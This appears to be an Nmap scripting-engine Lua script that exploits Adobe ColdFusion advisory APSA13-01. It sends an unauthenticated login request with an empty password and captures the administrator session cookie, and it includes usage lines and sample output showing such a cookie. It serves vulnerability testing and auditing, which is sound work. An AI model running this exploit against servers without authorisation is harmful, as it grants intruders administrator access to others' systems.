description = [[
Attempts to exploit an authentication bypass vulnerability in Adobe Coldfusion
servers to retrieve a valid administrator's session cookie.

Reference:
* APSA13-01: http://www.adobe.com/support/security/advisories/apsa13-01.html
]]

---
-- @usage nmap -sV --script http-adobe-coldfusion-apsa1301 <target>
-- @usage nmap -p80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-adobe-coldfusion-apsa1301:
-- |_  admin_cookie: aW50ZXJhY3RpdmUNQUEyNTFGRDU2NzM1OEYxNkI3REUzRjNCMjJERTgxOTNBNzUxN0NEMA1jZmFkbWlu
--
-- @args http-adobe-coldfusion-apsa1301.basepath URI path to administrator.cfc. Default: /CFIDE/adminapi/
--
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "vuln"}

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local url = require "url"

portrule = shortport.http
local DEFAULT_PATH = "/CFIDE/adminapi/"
local MAGIC_URI = "administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true"
---
-- Extracts the admin cookie by reading CFAUTHORIZATION_cfadmin from the header 'set-cookie'
--
local function get_admin_cookie(host, port, basepath)
  local req = http.get(host, port, url.absolute(basepath, MAGIC_URI))
  if not req then return nil end
  for _, ck in ipairs(req.cookies or {}) do
    stdnse.debug2("Set-Cookie for %q detected in response.", ck.name)
    if ck.name == "CFAUTHORIZATION_cfadmin" and ck.value:len() > 79 then
      stdnse.debug1("Extracted cookie:%s", ck.value)
      return ck.value
    end
  end
  return nil
end

action = function(host, port)
  local output_tab = stdnse.output_table()
  local basepath = stdnse.get_script_args(SCRIPT_NAME..".basepath") or DEFAULT_PATH
  local cookie = get_admin_cookie(host, port, basepath)
  if cookie then
    output_tab.admin_cookie = cookie
  else
    return nil
  end

  return output_tab
end
